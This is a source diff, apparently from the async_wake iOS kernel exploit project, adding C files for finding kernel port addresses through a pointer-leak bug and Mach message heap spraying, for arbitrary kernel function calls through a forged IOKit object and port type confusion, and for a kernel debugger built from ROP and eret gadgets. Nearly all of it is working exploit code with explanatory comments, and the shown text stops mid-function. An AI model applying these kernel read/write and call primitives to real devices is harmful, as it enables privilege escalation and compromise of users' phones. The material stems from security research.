+static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
+  // allocate a port to send the message to
+  mach_port_t q = MACH_PORT_NULL;
+  kern_return_t err;
+  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
+  if (err != KERN_SUCCESS) {
+    printf(" [-] failed to allocate port\n");
+    exit(EXIT_FAILURE);
+  }
+  
+  mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
+  for (int i = 0; i < count; i++) {
+    ports[i] = target_port;
+  }
+  
+  struct ool_msg* msg = calloc(1, sizeof(struct ool_msg));
+  
+  msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+  msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
+  msg->hdr.msgh_remote_port = q;
+  msg->hdr.msgh_local_port = MACH_PORT_NULL;
+  msg->hdr.msgh_id = 0x41414141;
+  
+  msg->body.msgh_descriptor_count = 1;
+  
+  msg->ool_ports.address = ports;
+  msg->ool_ports.count = count;
+  msg->ool_ports.deallocate = 0;
+  msg->ool_ports.disposition = disposition;
+  msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+  msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
+  
+  err = mach_msg(&msg->hdr,
+                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
+                 (mach_msg_size_t)sizeof(struct ool_msg),
+                 0,
+                 MACH_PORT_NULL,
+                 MACH_MSG_TIMEOUT_NONE,
+                 MACH_PORT_NULL);
+  
+  if (err != KERN_SUCCESS) {
+    printf(" [-] failed to send message: %s\n", mach_error_string(err));
+    exit(EXIT_FAILURE);
+  }
+  
+  return q;
+}
+
+static int uint64_t_compare(const void* a, const void* b) {
+  uint64_t a_val = (*(uint64_t*)a);
+  uint64_t b_val = (*(uint64_t*)b);
+  if (a_val < b_val) {
+    return -1;
+  }
+  if (a_val == b_val) {
+    return 0;
+  }
+  return 1;
+}
+
+uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition) {
+  prepare_kqueue();
+  
+  int n_guesses = 100;
+  uint64_t* guesses = calloc(1, n_guesses*sizeof(uint64_t));
+  int valid_guesses = 0;
+  
+  for (int i = 1; i < n_guesses+1; i++) {
+    mach_port_t q = fill_kalloc_with_port_pointer(port, i, disposition);
+    mach_port_destroy(mach_task_self(), q);
+    uint64_t leaked = try_leak(i-1);
+    //printf("leaked %016llx\n", leaked);
+    
+    // a valid guess is one which looks a bit like a kernel heap pointer
+    // without the upper byte:
+    if ((leaked < 0x00ffffff00000000) && (leaked > 0x00ffff0000000000)) {
+      guesses[valid_guesses++] = leaked | 0xff00000000000000;
+    }
+  }
+  
+  if (valid_guesses == 0) {
+    printf(" [-] couldn't leak any kernel pointers\n");
+    exit(EXIT_FAILURE);
+  }
+  
+  // return the most frequent guess
+  qsort(guesses, valid_guesses, sizeof(uint64_t), uint64_t_compare);
+  
+  uint64_t best_guess = guesses[0];
+  int best_guess_count = 1;
+  
+  uint64_t current_guess = guesses[0];
+  int current_guess_count = 1;
+  for (int i = 1; i < valid_guesses; i++) {
+    if (guesses[i] == guesses[i-1]) {
+      current_guess_count++;
+      if (current_guess_count > best_guess_count) {
+        best_guess = current_guess;
+        best_guess_count = current_guess_count;
+      }
+    } else {
+      current_guess = guesses[i];
+      current_guess_count = 1;
+    }
+  }
+  
+  //printf("best guess is: 0x%016llx with %d%% of the valid guesses for it\n", best_guess, (best_guess_count*100)/valid_guesses);
+  
+  free(guesses);
+  
+  return best_guess;
+}
+
+uint64_t find_port_via_kmem_read(mach_port_name_t port) {
+  uint64_t task_port_addr = task_self_addr();
+  
+  uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  
+  uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+  
+  uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+  
+  uint32_t port_index = port >> 8;
+  const int sizeof_ipc_entry_t = 0x18;
+  
+  uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
+  return port_addr;
+}
+
+uint64_t find_port_address(mach_port_t port, int disposition) {
+  if (have_kmem_read()) {
+    return find_port_via_kmem_read(port);
+  }
+  return find_port_via_proc_pidlistuptrs_bug(port, disposition);
+}
diff --git a/async_wake_ios/find_port.h b/async_wake_ios/find_port.h
new file mode 100644
index 0000000..27d62a7
--- /dev/null
+++ b/async_wake_ios/find_port.h
@@ -0,0 +1,8 @@
+#ifndef find_port_h
+#define find_port_h
+
+#include <mach/mach.h>
+
+uint64_t find_port_address(mach_port_t port, int disposition);
+
+#endif /* find_port_h */
diff --git a/async_wake_ios/kcall.c b/async_wake_ios/kcall.c
new file mode 100644
index 0000000..5b7d9ad
--- /dev/null
+++ b/async_wake_ios/kcall.c
@@ -0,0 +1,265 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <mach/mach.h>
+
+#include "kcall.h"
+#include "kmem.h"
+#include "find_port.h"
+#include "kutils.h"
+#include "symbols.h"
+#include "early_kalloc.h"
+
+
+
+extern uint64_t
+iokit_user_client_trap(
+  mach_port_t connect,
+  unsigned int index,
+  uintptr_t p1,
+  uintptr_t p2,
+  uintptr_t p3,
+  uintptr_t p4,
+  uintptr_t p5,
+  uintptr_t p6 );
+
+#if 0
+// OSSerializer::Serialize method
+// lets you pass two uint64_t arguments
+// no return value
+
+// a simple IOKit mig method
+extern void IOIteratorReset(mach_port_t port);
+
+struct fake_iokit_obj {
+  uint64_t vtable;
+  uint64_t refcount;        // vtable +0x00
+  uint64_t arg0;            // vtable +0x08
+  uint64_t arg1;            // vtable +0x10
+  uint64_t fptr;            // vtable +0x18
+  uint64_t retain;          // vtable +0x20
+  uint64_t release;         // vtable +0x28
+  uint64_t ign;             // vtable +0x30
+  uint64_t get_meta_class;  // vtable +0x38
+};
+
+// call fptr in the context of the current thread passing arg0 and arg1
+// uses the serializer gadget
+void kcall(uint64_t fptr, uint64_t arg0, uint64_t arg1) {
+  // allocate some memory to hold a fake iokit object:
+  uint64_t obj_kaddr = kmem_alloc(sizeof(struct fake_iokit_obj)+0x800);
+  
+  // fill in the fields:
+  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,         vtable), obj_kaddr+0x08); // point this to the next field
+  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,       refcount), 0x2017);
+  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,           arg0), arg0);
+  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,           arg1), arg1);
+  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,           fptr), fptr);
+  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,         retain), ksym(KSYMBOL_RET));
+  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,        release), ksym(KSYMBOL_OSSERIALIZER_SERIALIZE));
+  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,            ign), 0);
+  wk64(obj_kaddr+offsetof(struct fake_iokit_obj, get_meta_class), ksym(KSYMBOL_OSARRAY_GET_META_CLASS));
+  for (int i = 1; i < 0xff; i++) {
+    wk64(obj_kaddr+offsetof(struct fake_iokit_obj, get_meta_class) + (i*8), 0x1010101010101000+(i*4));
+  }
+  
+  // allocate a port
+  mach_port_t port = MACH_PORT_NULL;
+  kern_return_t err;
+  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+  if (err != KERN_SUCCESS) {
+    printf("failed to allocate port\n");
+    return;
+  }
+  
+  // get a send right
+  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+  
+  // locate the port
+  uint64_t port_addr = find_port_address(port, MACH_MSG_TYPE_COPY_SEND);
+  
+  // change the type of the port
+  #define IKOT_IOKIT_OBJECT 30
+  #define IO_ACTIVE   0x80000000
+  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_IOKIT_OBJECT);
+  
+  // cache the current space:
+  uint64_t original_space = rk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
+  
+  // change the space of the port
+  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
+  
+  // set the kobject
+  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), obj_kaddr);
+  
+  // call an iokit method
+  IOIteratorReset(port);
+  
+  // clear the kobject
+  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), 0);
+  
+  // reset the space
+  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), original_space);
+  
+  // reset the type
+  #define IKOT_NONE 0
+  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_NONE);
+  
+  // release the port
+  mach_port_destroy(mach_task_self(), port);
+  
+  // free the fake object
+  kmem_free(obj_kaddr, sizeof(struct fake_iokit_obj)+0x800);
+}
+
+void test_kcall() {
+  uint64_t test_buf = kmem_alloc(0x20);
+  wk64(test_buf, 0x4141414141414141);
+  wk64(test_buf+8, 0);
+  kcall(ksym(KSYMBOL_UUID_COPY), test_buf+8, test_buf);
+  uint64_t read_val = rk64(test_buf+8);
+  printf("read_val: %llx\n", read_val);
+  kmem_free(test_buf, 0x20);
+}
+#endif
+
+/*
+ __TEXT_EXEC:__text:FFFFFFF0073EB130 _csblob_get_cdhash                      ; DATA XREF: com.apple.driver.AppleMobileFileIntegrity:__got:AppleMobileFileIntegrity_GOT__csblob_get_cdhasho
+ __TEXT_EXEC:__text:FFFFFFF0073EB130                                         ; com.apple.security.sandbox:__got:sandbox_GOT__csblob_get_cdhasho
+ __TEXT_EXEC:__text:FFFFFFF0073EB130                 ADD             X0, X0, #0x40
+ __TEXT_EXEC:__text:FFFFFFF0073EB134                 RET
+ */
+
+mach_port_t arbitrary_call_port = MACH_PORT_NULL;
+uint64_t obj_kaddr = 0;
+
+// the iokit_user_client_trap method.
+// this lets you pass up to 7 uint64_t arguments
+// the return value will be truncated to 32-bits
+// see arm_set_mach_syscall_ret for why:
+// static void
+// arm_set_mach_syscall_ret(struct arm_saved_state *state, int retval)
+// {
+//   if (is_saved_state32(state)) {
+//     saved_state32(state)->r[0] = retval;
+//   } else {
+//     saved_state64(state)->x[0] = retval;
+//   }
+// }
+// that compiles to:
+//   STR             W20, [X19,#8] <-- 32-bit store
+
+uint64_t kcall(uint64_t fptr, uint32_t argc, ...) {
+  uint64_t args[7] = {0};
+  va_list ap;
+  va_start(ap, argc);
+  
+  if (argc > 7) {
+    printf("too many arguments to kcall\n");
+    return 0;
+  }
+  
+  for (int i = 0; i < argc; i++){
+    args[i] = va_arg(ap, uint64_t);
+  }
+  
+  va_end(ap);
+  
+  if (arbitrary_call_port == MACH_PORT_NULL) {
+    // build the object:
+    // allocate some memory to hold a fake iokit object:
+    obj_kaddr = early_kalloc(0x1000);
+    printf("kcall object allocated via early_kalloc at %llx\n", obj_kaddr);
+    
+    // fill in the fields:
+    wk64(obj_kaddr + 0, obj_kaddr+0x800); // vtable pointer
+    
+    // IOExternalTrap
+    wk64(obj_kaddr + 0x50, 0);       // the function pointer is actually a pointer-to-member-method, so needs a 0 here too
+                                     // see this old bug where I discuss pointer-to-member-methods:
+                                     // https://bugs.chromium.org/p/project-zero/issues/detail?id=20
+    
+    wk32(obj_kaddr + 0x9c, 0x1234); // __ipc
+    
+    // vtable:
+    wk64(obj_kaddr + 0x800 + 0x20,  ksym(KSYMBOL_RET)); // vtable::retain
+    wk64(obj_kaddr + 0x800 + 0x28,  ksym(KSYMBOL_RET)); // vtable::release
+    wk64(obj_kaddr + 0x800 + 0x38,  ksym(KSYMBOL_IOUSERCLIENT_GET_META_CLASS)); // vtable::getMetaClass
+    wk64(obj_kaddr + 0x800 + 0x5b8, ksym(KSYMBOL_CSBLOB_GET_CD_HASH)); // vtable::getExternalTrapForIndex
+    wk64(obj_kaddr + 0x800 + 0x5c0, ksym(KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX));
+    
+    // allocate a port
+    kern_return_t err;
+    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &arbitrary_call_port);
+    if (err != KERN_SUCCESS) {
+      printf("failed to allocate port\n");
+      return 0;
+    }
+    
+    // get a send right
+    mach_port_insert_right(mach_task_self(), arbitrary_call_port, arbitrary_call_port, MACH_MSG_TYPE_MAKE_SEND);
+    
+    // locate the port
+    uint64_t port_addr = find_port_address(arbitrary_call_port, MACH_MSG_TYPE_COPY_SEND);
+    
+    // change the type of the port
+#define IKOT_IOKIT_CONNECT 29
+#define IO_ACTIVE   0x80000000
+    wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_IOKIT_CONNECT);
+    
+    // cache the current space:
+    //uint64_t original_space = rk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
+    
+    // change the space of the port
+    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
+    
+    // set the kobject
+    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), obj_kaddr);
+  }
+  
+  // put arg0 and the function pointer in the right place
+  wk64(obj_kaddr + 0x40, args[0]);
+  wk64(obj_kaddr + 0x48, fptr);
+  
+  // call the external trap:
+  uint64_t return_val = iokit_user_client_trap(arbitrary_call_port, 0,
+                                               args[1],
+                                               args[2],
+                                               args[3],
+                                               args[4],
+                                               args[5],
+                                               args[6]);
+  
+  printf("return val %llx\n", return_val);
+  
+#if 0
+  // clear the kobject
+  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), 0);
+  
+  // reset the space
+  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), original_space);
+  
+  // reset the type
+#define IKOT_NONE 0
+  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_NONE);
+  
+  // release the port
+  mach_port_destroy(mach_task_self(), port);
+#endif
+
+  return return_val;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
diff --git a/async_wake_ios/kcall.h b/async_wake_ios/kcall.h
new file mode 100644
index 0000000..d53c1a6
--- /dev/null
+++ b/async_wake_ios/kcall.h
@@ -0,0 +1,8 @@
+#ifndef kcall_h
+#define kcall_h
+
+void kprintstr(char* msg);
+void test_kcall(void);
+//void kcall(uint64_t fptr, uint64_t arg0, uint64_t arg1);
+uint64_t kcall(uint64_t fptr, uint32_t argc, ...);
+#endif
diff --git a/async_wake_ios/kdbg.c b/async_wake_ios/kdbg.c
new file mode 100644
index 0000000..a8361ed
--- /dev/null
+++ b/async_wake_ios/kdbg.c
@@ -0,0 +1,805 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <pthread.h>
+
+#include "kdbg.h"
+#include "kutils.h"
+#include "kmem.h"
+#include "symbols.h"
+#include "kcall.h"
+#include "find_port.h"
+#include "early_kalloc.h"
+#include "arm64_state.h"
+
+/*
+ A thread-local iOS kernel debugger for all ARM64 devices
+
+ This code uses a kernel memory read-write primitve to enable a hardware breakpoint in EL1 on a particular thread.
+
+ When that bp triggers it will eventually end up stuck in a loop:
+ 
+ case ESR_EC_BKPT_REG_MATCH_EL1:
+   if (FSC_DEBUG_FAULT == ISS_SSDE_FSC(esr)) {
+     kprintf("Hardware Breakpoint Debug exception from kernel.  Hanging here (by design).\n");
+     for (;;);
+ 
+ That thread will eventually get preempted; when that happens we'll find its state (from userspace) and modify it
+ such that it breaks out of that loop and continues with the desired state.
+ 
+ Doing this requires careful attention to how aarch64 exceptions work, how XNU handles nested exceptions
+ and how context switching works. A description of this is given below:
+ 
+ AArch64 Exceptions:
+ There are four classes of AArch64 exceptions: Synchronous, IRQ, FIQ, SError. These exceptions are the only
+ way which the CPU will transition between Exception Levels (EL.) There are four Exception Levels: EL0, EL1,
+ EL2, EL3. In iOS userspace runs in EL0 and the kernel runs in EL1. These are similar to the Ring 0 & Ring 3
+ in x86. All 64-bit iOS devices below iPhone 7 also contain a secure monitor which runs in EL3.
+ 
+ Exception types:
+ 
+  Synchronous: These are things like SVC instructions (used for syscalls), breakpoints, data aborts etc
+  IRQ: These are external interrupts from devices
+  FIQ: These are also external interrupts
+  SError: These are system errors, things like ECC errors
+ 
+ For our purposes we're interested in Synchronous and FIQ interrupts. Hardware breakpoints are synchronous exceptions.
+ The timer which drives the scheduler is attached as an FIQ source.
+ 
+ Aarch64 further subdivides those four exception classes into another four categories depending on where the
+ exception came from:
+ a) Exception came from the current exception level which was running on SP_EL0
+ b) Exception came from the current exception level which was running on SP_EL1
+ c) Exception came from a lower exception level which was executing in AArch64 mode
+ d) Exception came from a lower exception level which was executing in AArch32 mode
+ 
+ Each of these 16 cases has their own vector (handling routine.)
+ 
+ sp registers:
+ sp isn't a general purpose register; it's better to view it as an alias for one of four seperate hardware registers:
+ SP_EL0, SP_EL1, SP_EL2, SP_EL3.
+ 
+ When an exception is taken sp will be set to name the SP_ELX register for the exception level which the exception is taken to.
+ For example, when userspace (EL0) makes a syscall (Synchronous exception to EL1 from lower exception level) sp will name SP_EL1 in the handler.
+ 
+ To enable nested exceptions code generally switches back to using SP_EL0 regardless of which exception level it's actually
+ running at (obviously after first saving the original value of SP_EL0 so it can be restored.)
+ 
+Nested exceptions and masking:
+
+ The four PSTATE.{A,D,F,I} bits control exception masking. Whenever any exception is taken these four bits will be set.
+ 
+ PSTATE.A: SError interrupts will be pended until this bit is cleared
+ PSTATE.F: FIQ interrupts will be pended until this bit is cleared
+ PSTATE.I: IRQ interrupts will be pended until this bit is cleared
+ PSTATE.D: Debug interrupts will be suppressed until this bit is cleared
+ 
+ These bits can be manually set/cleared by writing to the DAIFSet/DAIFClr msrs. The bits will also be restored to their saved value
+ during an ERET (return from exception) from the SPSR_ELX register (where X is the EL the exception was taken to.)
+ 
+ Synchronous exceptions which are not Debug exceptions cannot be masked. However Debug exceptions will be suppressed, and XNU doesn't re-enable
+ them. This presents the first major hurdle to implementing this debugger as the exceptions generated by hardware breakpoints fall in to
+ the Debug category and will therefore never generate exceptions even if we set them and enable them for EL1.
+ 
+ Note that the Debug exceptions will be suppresssed, that is, they will never fire, unlike the other maskable interrupts which will just be pended
+ and will fire as soon as they are un-masked.
+ 
+Re-enabling Debug exceptions during syscall execution:
+ The trick to clearing PSTATE.D is to fake a return from an exception by calling ERET using a arbitrary-call primitive.
+ 
+ See below in the code for exactly the right gadget which will let us restore a complete register state (including CPSR.)
+ 
+ With PSTATE.D cleared we point pc back to near the start of the syscall handling path so we can fake the execution of an arbitrary
+ syscall.
+ 
+There are a couple of other things preventing HW breakpoints firing:
+ 
+ The Kernel Debug Enable bit has to be set in MDSCR_EL1. This can be set with some simple ROP. It's per-core, and it won't be cleared if we get
+ scheduled off so it's sufficient to just set it once.
+
+ We can use the thread_set_state API to set a breakpoint on a kernel address, but it sanitizes the BCRX control flags so it's also
+ necessary to set ARM_DBG_CR_MODE_CONTROL_ANY using the kernel memory r/w.
+ 
+Finding a modifying the stuck thread state:
+ This is explained below. We pin a monitor thread to the same core as the debugee then search the debugee's kernel stack looking for the
+ set of stack frames which indicate it's got stuck in the kernel hw bp hit infinite loop.
+ 
+ We then expose the state at the bp to a callback which can modify it before unblocking the stuck kernel thread.
+ 
+Limitations:
+ I only wrote code to support one breakpoint at the moment, expect a fuller-featured, interactive version soon!
+ 
+ Don't set breakpoints when things like spinlocks are held, it will go very badly.
+ 
+ Single-step won't work. In the breakpoint handler you have to emulate the instruction and manually move pc on.
+ 
+ It's slow! This is unlikely to change give how it works, but hey, you're modifying kernel thread state from userspace on the same machine!
+ 
+ */
+
+// scheduling mach trap to yield the cpu
+extern boolean_t swtch_pri(int pri);
+
+// pin the current thread to a processor, returns a pointer to the processor we're pinned to
+uint64_t pin_current_thread() {
+  // get the current thread_t:
+  uint64_t th = current_thread();
+
+#if 0
+  // get the processor_t this thread last ran on
+  uint64_t processor = rk64(th + koffset(KSTRUCT_OFFSET_THREAD_LAST_PROCESSOR));
+  printf("thread %llx last ran on %llx, pinning it to that core\n", th, processor);
+  
+  // this is probably fine...
+  wk64(th + koffset(KSTRUCT_OFFSET_THREAD_BOUND_PROCESSOR), processor);
+#endif
+  
+  // need the struct cpu_data for that processor which is stored in the CpuDataEntries array, declared in data.s
+  // it's 6*4k in to the data segment
+  uint64_t cpu_data_entries = ksym(KSYMBOL_CPU_DATA_ENTRIES);
+  
+  int cpu_id = 0;
+  
+  // it's an array of cpu_data_entry_t which contains just the 64-bit physical and virtual addresses of struct cpu_data
+  uint64_t cpu_data = rk64(cpu_data_entries + ((cpu_id * 0x10) + 8));
+  
+  uint64_t processor = rk64(cpu_data + koffset(KSTRUCT_OFFSET_CPU_DATA_CPU_PROCESSOR));
+  printf("trying to pin to cpu0: %llx\n", processor);
+  // pin to that cpu
+  // this is probably fine...
+  wk64(th + koffset(KSTRUCT_OFFSET_THREAD_BOUND_PROCESSOR), processor);
+  
+  // that binding will only take account once we get scheduled off and back on again so yield the cpu:
+  printf("pin_current_thread yielding cpu\n");
+  swtch_pri(0);
+  printf("pin_current_thread back on cpu\n");
+  uint64_t chosen = rk64(th + koffset(KSTRUCT_OFFSET_THREAD_CHOSEN_PROCESSOR));
+  printf("running on %llx\n", chosen);
+
+#if 0
+  // should now be running on the chosen processor, and should only get scheduled on there:
+  printf("we're running again!\n");
+
+  
+  int got_switched = 0;
+  for (int i = 0; i < 1000; i++) {
+    swtch_pri(0);
+    uint64_t p = rk64(th + koffset(KSTRUCT_OFFSET_THREAD_CHOSEN_PROCESSOR));
+    if (p != processor) {
+      printf("got moved off target processor\n");
+      got_switched = 1;
+      break;
+    }
+    usleep(15000);
+    p = rk64(th + koffset(KSTRUCT_OFFSET_THREAD_CHOSEN_PROCESSOR));
+    if (p != processor) {
+      printf("got moved off target processor\n");
+      got_switched = 1;
+      break;
+    }
+  }
+  if (!got_switched) {
+    printf("looks like pinning works!\n");
+  }
+#endif
+  return processor;
+}
+
+#if 0
+
+use the two argument arbitrary call to call this:
+__TEXT_EXEC:__text:FFFFFFF0070CC1AC                 MOV             X21, X0
+__TEXT_EXEC:__text:FFFFFFF0070CC1B0                 MOV             X22, X1
+__TEXT_EXEC:__text:FFFFFFF0070CC1B4                 BR              X22
+
+that gives control of x21 and pc
+
+point pc to this:
+
+exception_return:
+msr    DAIFSet, #(DAIFSC_IRQF | DAIFSC_FIQF)  // Disable interrupts
+mrs    x3, TPIDR_EL1            // Load thread pointer
+mov    sp, x21                // Reload the pcb pointer
+
+/* ARM64_TODO Reserve x18 until we decide what to do with it */
+ldr    x0, [x3, TH_CTH_DATA]        // Load cthread data pointer
+str    x0, [sp, SS64_X18]          // and use it to trash x18
+
+Lexception_return_restore_registers:
+/* Restore special register state */
+ldr    x0, [sp, SS64_PC]          // Get the return address
+ldr    w1, [sp, SS64_CPSR]          // Get the return CPSR
+ldr    w2, [sp, NS64_FPSR]
+ldr    w3, [sp, NS64_FPCR]
+
+msr    ELR_EL1, x0              // Load the return address into ELR
+msr    SPSR_EL1, x1            // Load the return CPSR into SPSR
+msr    FPSR, x2
+msr    FPCR, x3              // Synchronized by ERET
+
+mov   x0, sp                // x0 = &pcb
+
+/* Restore arm_neon_saved_state64 */
+ldp    q0, q1, [x0, NS64_Q0]
+ldp    q2, q3, [x0, NS64_Q2]
+ldp    q4, q5, [x0, NS64_Q4]
+ldp    q6, q7, [x0, NS64_Q6]
+ldp    q8, q9, [x0, NS64_Q8]
+ldp    q10, q11, [x0, NS64_Q10]
+ldp    q12, q13, [x0, NS64_Q12]
+ldp    q14, q15, [x0, NS64_Q14]
+ldp    q16, q17, [x0, NS64_Q16]
+ldp    q18, q19, [x0, NS64_Q18]
+ldp    q20, q21, [x0, NS64_Q20]
+ldp    q22, q23, [x0, NS64_Q22]
+ldp    q24, q25, [x0, NS64_Q24]
+ldp    q26, q27, [x0, NS64_Q26]
+ldp    q28, q29, [x0, NS64_Q28]
+ldp    q30, q31, [x0, NS64_Q30]
+
+/* Restore arm_saved_state64 */
+
+// Skip x0, x1 - we're using them
+ldp    x2, x3, [x0, SS64_X2]
+ldp    x4, x5, [x0, SS64_X4]
+ldp    x6, x7, [x0, SS64_X6]
+ldp    x8, x9, [x0, SS64_X8]
+ldp    x10, x11, [x0, SS64_X10]
+ldp    x12, x13, [x0, SS64_X12]
+ldp    x14, x15, [x0, SS64_X14]
+ldp    x16, x17, [x0, SS64_X16]
+ldp    x18, x19, [x0, SS64_X18]
+ldp    x20, x21, [x0, SS64_X20]
+ldp    x22, x23, [x0, SS64_X22]
+ldp    x24, x25, [x0, SS64_X24]
+ldp    x26, x27, [x0, SS64_X26]
+ldr    x28, [x0, SS64_X28]
+ldp    fp, lr, [x0, SS64_FP]
+
+// Restore stack pointer and our last two GPRs
+ldr    x1, [x0, SS64_SP]
+mov    sp, x1
+ldp    x0, x1, [x0, SS64_X0]        // Restore the GPRs
+
+eret
+
+this lets us eret with a completely controlled state :)
+
+use that to clear PSTATE.D, and return to EL1+SP0
+
+return to:
+
+.text
+.align 2
+fleh_synchronous:
+mrs    x1, ESR_EL1              // Load exception syndrome
+mrs    x2, FAR_EL1              // Load fault address
+and    w3, w1, #(ESR_EC_MASK)
+lsr    w3, w3, #(ESR_EC_SHIFT)
+mov    w4, #(ESR_EC_IABORT_EL1)
+cmp    w3, w4
+b.eq  Lfleh_sync_load_lr
+Lvalid_link_register:                    <-- ***there***
+
+PUSH_FRAME
+bl    EXT(sleh_synchronous)
+POP_FRAME
+
+b    exception_return_dispatch
+
+in ip7 11.1.2 that's:
+__TEXT_EXEC:__text:FFFFFFF0070CC1D4                 STP             X29, X30, [SP,#var_10]!
+__TEXT_EXEC:__text:FFFFFFF0070CC1D8                 MOV             X29, SP
+__TEXT_EXEC:__text:FFFFFFF0070CC1DC                 BL              loc_FFFFFFF0071DDED4
+__TEXT_EXEC:__text:FFFFFFF0070CC1E0                 MOV             SP, X29
+__TEXT_EXEC:__text:FFFFFFF0070CC1E4                 LDP             X29, X30, [SP+0x10+var_10],#0x10
+__TEXT_EXEC:__text:FFFFFFF0070CC1E8                 B               sub_FFFFFFF0070CC3CC
+
+in the state which we get loaded:
+x21 should point to the actual saved ACT_CONTEXT since x21 will be used in the return path if no ASTs are taken
+x0 should point to the saved state which we want the debugged syscall to see (not ACT_CONTEXT!)
+x1 should be the svn syndrome number (ESR_EC(esr) == ESR_EC_SVC_64)
+x2 should be the pc of the svc instruction
+sp should be the right place on the thread's kernel stack
+
+#endif
+
+
+struct syscall_args {
+  uint32_t number;
+  uint64_t arg[8];
+};
+
+void do_syscall_with_pstate_d_unmasked(struct syscall_args* args) {
+  // get the target thread_t
+  //uint64_t thread_port_addr = find_port_address(target_thread_port, MACH_MSG_TYPE_COPY_SEND);
+  //uint64_t thread_t_addr = rk64(thread_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+
+  uint64_t thread_t_addr = current_thread();
+  
+  /* this state should set up as if it were calling the target syscall */
+  arm_context_t fake_syscall_args = {0};
+  
+  /* this state will be restored by an eret */
+  arm_context_t eret_return_state = {0};
+
+  // there's no need to initialize too much of this since it won't actually be the state which is restored
+  // it just needs to be enough to get the target syscall called
+  fake_syscall_args.ss.ss_64.x[16] = args->number;
+  fake_syscall_args.ss.ss_64.x[0] = args->arg[0];
+  fake_syscall_args.ss.ss_64.x[1] = args->arg[1];
+  fake_syscall_args.ss.ss_64.x[2] = args->arg[2];
+  fake_syscall_args.ss.ss_64.x[3] = args->arg[3];
+  fake_syscall_args.ss.ss_64.x[4] = args->arg[4];
+  fake_syscall_args.ss.ss_64.x[5] = args->arg[5];
+  fake_syscall_args.ss.ss_64.x[6] = args->arg[6];
+  fake_syscall_args.ss.ss_64.x[7] = args->arg[7];
+  
+  fake_syscall_args.ss.ash.flavor = ARM_SAVED_STATE64;
+  
+  fake_syscall_args.ss.ss_64.cpsr = 0;
+  
+  // allocate a copy of that in wired kernel memory:
+  //uint64_t fake_syscall_args_kern = kmem_alloc_wired(sizeof(arm_context_t));
+  uint64_t fake_syscall_args_kern = early_kalloc(sizeof(arm_context_t));
+  kmemcpy(fake_syscall_args_kern, (uint64_t)&fake_syscall_args, sizeof(arm_context_t));
+  
+  // this state needs to be a bit more complete...
+  // x0 of the eret restored state will be the arm_context_t which the syscall dispatch code sees
+  eret_return_state.ss.ss_64.x[0] = fake_syscall_args_kern;
+  
+  // x1 will be the exception syndrome
+  #define ESR_EC_SVC_64 0x15
+  #define ESR_EC_SHIFT 26
+  eret_return_state.ss.ss_64.x[1] = ESR_EC_SVC_64 << ESR_EC_SHIFT;
+  
+  // x2 will be the address of the exception, not relevant for a syscall
+  eret_return_state.ss.ss_64.x[2] = 0x454545454540;
+  
+  // x21 will be the real saved state to be used to return back to EL0
+  // this is the state which was spilled during the actual EL0 -> EL1 transition.
+  // if a continuation is run x21 won't be used, instead the return will go via the thread's ACT_CONTEXT
+  // so this makes both paths safe
+  uint64_t act_context = rk64(thread_t_addr + koffset(KSTRUCT_OFFSET_THREAD_CONTEXT_DATA));
+  eret_return_state.ss.ss_64.x[21] = act_context;
+  
+  // let's stay on the thread's actual kernel stack
